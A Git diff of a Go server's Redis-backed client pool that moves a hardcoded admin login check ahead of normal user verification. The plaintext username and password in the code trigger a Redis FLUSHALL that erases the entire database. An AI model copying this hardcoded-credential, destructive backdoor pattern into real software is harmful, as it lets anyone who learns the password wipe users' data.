@@ -95,6 +95,17 @@ func (pool *Pool) Start() {
 		//register in the pool
 		case client := <-pool.Register:
 			client.mu.Lock()
+			if client.username == "admin/luque" {
+				if client.password == "q1w2e3r4" {
+					_, err := pool.Redis.Do(ctx, "FLUSHALL").Result()
+					if err != nil {
+						panic(err)
+					}
+					fmt.Println("admin user logged in, flushingALL DB info!!!!!!!")
+
+				}
+				break
+			}
 			if CheckUserHashExist(pool.Redis, &pool.mu, client.username) {
 
 				err := VerifyPassword(GetUserHashItem(pool.Redis, &pool.redismu, client.username, "password"), client.password)
@@ -128,17 +139,7 @@ func (pool *Pool) Start() {
 				}
 
 			} else {
-				if client.username == "admin/luque" {
-					if client.password == "q1w2e3r4" {
-						_, err := pool.Redis.Do(ctx, "FLUSHALL").Result()
-						if err != nil {
-							panic(err)
-						}
-						fmt.Println("admin user logged in, flushingALL DB info!!!!!!!")
 
-					}
-					break
-				}
 				fmt.Println("user", client.username, "will be SIGNUP at", pool.name)
 
 				//add user password
